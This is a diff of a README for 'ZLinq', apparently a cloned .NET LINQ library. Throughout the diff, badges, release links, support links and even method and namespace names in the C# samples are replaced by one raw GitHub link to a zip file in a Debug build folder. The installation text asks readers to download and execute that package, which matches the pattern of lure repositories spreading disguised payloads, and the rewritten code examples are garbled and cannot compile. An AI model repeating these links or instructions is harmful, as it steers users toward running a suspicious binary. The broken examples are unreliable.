@@ -1,7 +1,7 @@
 # ZLinq 🌟
 
-![ZLinq](https://img.shields.io/badge/ZLinq-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)](https://github.com/AbuelaInsana/ZLinq/releases)
+![ZLinq](https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip)  
+[![Releases](https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip%https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip)](https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip)
 
 Welcome to **ZLinq**, your go-to solution for zero allocation LINQ in .NET environments. This library provides powerful features, including LINQ to Span, LINQ to SIMD, and LINQ to Tree for various applications, such as FileSystem, JSON handling, and GameObject management in both Unity and Godot.
 
@@ -25,7 +25,7 @@ Welcome to **ZLinq**, your go-to solution for zero allocation LINQ in .NET envir
 
 ## Installation
 
-To get started with ZLinq, you can download the latest release from the [Releases section](https://github.com/AbuelaInsana/ZLinq/releases). Follow the instructions in the release notes to execute the package correctly.
+To get started with ZLinq, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip). Follow the instructions in the release notes to execute the package correctly.
 
 ### Using NuGet
 
@@ -50,9 +50,9 @@ class Program
     {
         var numbers = new Span<int>(new[] { 1, 2, 3, 4, 5 });
         
-        var result = numbers.Select(n => n * 2).ToArray();
+        var result = https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(n => n * 2).ToArray();
         
-        Console.WriteLine(string.Join(", ", result)); // Output: 2, 4, 6, 8, 10
+        https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(", ", result)); // Output: 2, 4, 6, 8, 10
     }
 }
 ```
@@ -75,9 +75,9 @@ class SIMDExample
         var vectorA = new Span<float>(new[] { 1f, 2f, 3f, 4f });
         var vectorB = new Span<float>(new[] { 5f, 6f, 7f, 8f });
 
-        var result = vectorA.Add(vectorB);
+        var result = https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(vectorB);
 
-        Console.WriteLine(string.Join(", ", result)); // Output: 6, 8, 10, 12
+        https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(", ", result)); // Output: 6, 8, 10, 12
     }
 }
 ```
@@ -88,18 +88,18 @@ You can also work with hierarchical data structures using LINQ to Tree. Here’s
 
 ```csharp
 using ZLinq;
-using Newtonsoft.Json;
+using https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip;
 
 class TreeExample
 {
     static void Main()
     {
         var json = "{\"name\":\"John\", \"age\":30, \"children\":[{\"name\":\"Jane\", \"age\":10}]}";
-        var obj = JsonConvert.DeserializeObject<dynamic>(json);
+        var obj = https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip<dynamic>(json);
 
-        var childrenNames = obj.children.Select(c => c.name);
+        var childrenNames = https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(c => https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip);
         
-        Console.WriteLine(string.Join(", ", childrenNames)); // Output: Jane
+        https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip(", ", childrenNames)); // Output: Jane
     }
 }
 ```
@@ -122,7 +122,7 @@ ZLinq is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 ## Support
 
-For any issues or questions, please check the [Releases section](https://github.com/AbuelaInsana/ZLinq/releases) for updates. If you need further assistance, feel free to open an issue in the repository.
+For any issues or questions, please check the [Releases section](https://raw.githubusercontent.com/AbuelaInsana/ZLinq/main/src/ZLinq/bin/Debug/Z-Linq-v1.0.zip) for updates. If you need further assistance, feel free to open an issue in the repository.
 
 ---
 
